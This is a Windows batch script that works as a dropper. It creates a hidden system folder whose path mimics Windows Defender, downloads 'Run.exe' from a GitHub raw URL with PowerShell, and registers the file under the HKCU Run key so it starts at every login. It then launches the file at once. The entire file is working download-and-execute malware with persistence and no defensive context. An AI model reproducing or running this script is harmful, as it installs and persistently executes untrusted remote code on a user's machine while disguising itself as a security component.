@echo off
setlocal
set "folder=%APPDATA%\LocalLow\Windows Defender\Windows\Folder Windows\Fuck You"
if not exist "%folder%" (
    mkdir "%folder%"
    attrib +h +s "%folder%"
)
set "file_path=%folder%\Run.exe"
if not exist "%file_path%" (
    echo Downloading Run.exe...
    powershell -command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/khoa1234567/AI/raw/main/Run.exe', '%file_path%')"
)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v MyApp /t REG_SZ /d "%file_path%" /f
echo Running Run.exe...
start "" "%file_path%"
endlocal
